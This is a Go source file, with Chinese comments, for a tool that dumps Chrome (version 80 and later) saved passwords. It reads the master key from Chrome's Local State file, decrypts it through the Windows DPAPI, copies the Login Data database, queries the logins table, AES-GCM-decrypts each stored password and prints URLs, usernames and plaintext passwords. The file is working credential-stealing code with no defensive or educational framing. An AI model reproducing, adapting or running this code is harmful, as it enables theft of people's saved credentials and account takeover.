package core

import (
	"Browser/crypher"
	"Browser/data"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"github.com/tidwall/gjson"
	"io/ioutil"
)
/*
	chrome 8.0 版本后的加密方式
*/

func AesGCMDeCrypt(crypted,key,nounce []byte)([]byte,error){
	// 解密aes
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	blockMode, _ := cipher.NewGCM(block)
	origData, err := blockMode.Open(nil, nounce, crypted, nil)
	if err != nil{
		return nil, err
	}
	return origData, nil
}

// 获取aes加密的key
func ReturnKeyFromLocalState()([]byte,error){
	/*
		32字节DPAPI加密
		5字节b'DPAPI'头
		base64编码存储
	*/
	resp, err := ioutil.ReadFile(RetrunChromeState())
	if err != nil {
		fmt.Println("Open Local State is failed ")
		return []byte{},err
	}
	masterKey ,err :=  base64.StdEncoding.DecodeString(gjson.Get(string(resp),"os_crypt.encrypted_key").String())
	if err != nil {
		return []byte{},err
	}
	// 移除DPAPI
	masterKey = masterKey[5:]
	// 利用win32api进行解密加密的key
	masterKey, err = crypher.WinDecypt(masterKey)
	if err != nil {
		return []byte{},err
	}
	return masterKey, nil
}

func DecryptPwd(pwd,masterKey []byte)([]byte,error){
	nounce := pwd[3:15]
	payload := pwd[15:]
	plain_pwd, err := AesGCMDeCrypt(payload,masterKey,nounce)
	if err != nil {
		return []byte{},nil
	}
	return plain_pwd,nil
}


func ChromeSQLiteV80() {
	if CopyFile(ReturnChrome(), data.LocalDB) {
		conn := ConnSQLite(data.LocalDB)
		if conn != nil {
			rows := QuerySQLite(conn, `SELECT origin_url, username_value, password_value FROM logins`)
			if rows != nil {
				for rows.Next() {
					var Url string
					var UserName string
					var PassWord []byte
					err := rows.Scan(&Url, &UserName, &PassWord)
					if err != nil {
						continue
					}
					masterKey, err := ReturnKeyFromLocalState()
					if err != nil {
						continue
					}
					DePwd, err := DecryptPwd(PassWord, masterKey)
					if UserName == "" || string(DePwd) == "" {
						continue
					} else {
						fmt.Println("[+]:",Url)
						fmt.Println("[UserName]:",UserName)
						fmt.Println("[Password]:",string(DePwd))
						fmt.Println("")
					}
				}
			}
		}
	}
}